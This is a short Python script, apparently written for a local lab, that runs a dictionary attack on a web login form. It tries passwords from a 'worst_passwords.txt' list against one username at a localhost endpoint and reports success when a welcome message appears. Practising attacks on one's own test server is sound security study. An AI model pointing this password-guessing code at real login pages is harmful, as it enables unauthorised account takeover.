import requests


def bruteForceLogin(hostname, users) -> bool:
    for username, password in users.items():
        response = requests.post(
            hostname, data={"username": username, "password": password}
        )
        # print(response.text)
        if (
            response.status_code == 200
            and f"Welcome back, {username}!" in response.text
        ):
            return True
        else:
            return False


if __name__ == "__main__":
    hostname = "http://127.0.0.1:5000/pythonlogin"
    with open("worst_passwords.txt", "r") as f:
        lines = f.readlines()
        for line in lines:
            password = line.strip()
            users = {
                "username1": password,
            }
            is_success = bruteForceLogin(hostname, users)
            if is_success:
                print(f"username1 {password} SUCCESS")
            else:
                print("FAILED")
